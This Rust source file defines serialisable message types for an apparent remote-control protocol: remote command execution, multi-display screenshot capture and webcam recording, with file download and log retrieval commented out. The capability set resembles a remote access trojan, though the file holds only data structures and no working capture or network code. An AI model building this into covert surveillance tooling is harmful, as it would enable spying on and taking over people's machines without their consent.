use serde::{self, Deserialize, Serialize};

pub const MESSAGE_LENGTH_SIZE: usize = 4;
pub const MESSAGE_HEADER_LENGTH: usize = MESSAGE_LENGTH_SIZE;

// raw error information
#[derive(Serialize, Deserialize, Debug)]
pub struct ErrorInfo {
    pub raw_os_error: i32,
    pub as_string: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct RunCommandRequest {
    pub command: String,
    pub async_run: bool,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct RunCommandResponse {
    pub output: String,
    pub error_info: Option<ErrorInfo>,
}


#[derive(Serialize, Deserialize, Debug)]
pub struct DisplayScreenshot {
    pub buffer: Vec<u8>,
    pub height: u32,
    pub width: u32
}

#[derive(Serialize, Deserialize, Debug)]
pub struct GetScreenshotResponse {
    pub screenshots: Vec<DisplayScreenshot>,
    pub error_info: Option<ErrorInfo>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct GetScreenshotRequest;

#[derive(Serialize, Deserialize, Debug)]
pub struct RecordWebcamRequest;

#[derive(Serialize, Deserialize, Debug)]
pub struct RecordWebcamResponse {
    pub frames: Vec<u8>,
    pub error_info: Option<ErrorInfo>,
}



#[derive(Serialize, Deserialize, Debug)]
pub enum Message {
    RunCommandRequest(RunCommandRequest),
    RunCommandResponse(RunCommandResponse),
    // DownloadFileRequest(DownloadFileRequest),
    // DownloadFileResponse(DownloadFileResponse),
    // GetBasicInfoRequest(GetBasicInfoRequest),
    // GetBasicInfoResponse(GetBasicInfoResponse),
    // GetLogsRequest(GetLogsRequest),
    // GetLogsResponse(GetLogsResponse),
    RecordWebcamRequest(RecordWebcamRequest),
    RecordWebcamResponse(RecordWebcamResponse),
    GetScreenshotRequest(GetScreenshotRequest),
    GetScreenshotResponse(GetScreenshotResponse),
}
